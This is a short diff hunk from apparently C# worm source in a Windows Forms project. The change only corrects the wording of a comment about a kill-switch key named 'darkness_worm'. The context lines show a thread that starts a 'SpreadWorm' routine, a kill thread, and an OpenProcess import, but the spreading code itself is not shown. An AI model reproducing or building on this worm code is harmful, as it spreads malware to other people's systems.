@@ -246,7 +246,7 @@ namespace WindowsFormsApplication2{ static class Program{public class Threadz{cl
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern IntPtr OpenProcess(int access, bool Ihandle, int procID);
         static void Main(){   
-            string keyforstop = "darkness_worm"; // this key is the responsable by stoper the worm attack
+            string keyforstop = "darkness_worm"; // this key is the responsable by to stop the worm attack
             Threadz SpreadWorm = new Threadz();
             Thread thread = new Thread(new ThreadStart(SpreadWorm.WorkSpreadFunction)); thread.Start();
             Threadz KillThread = new Threadz();
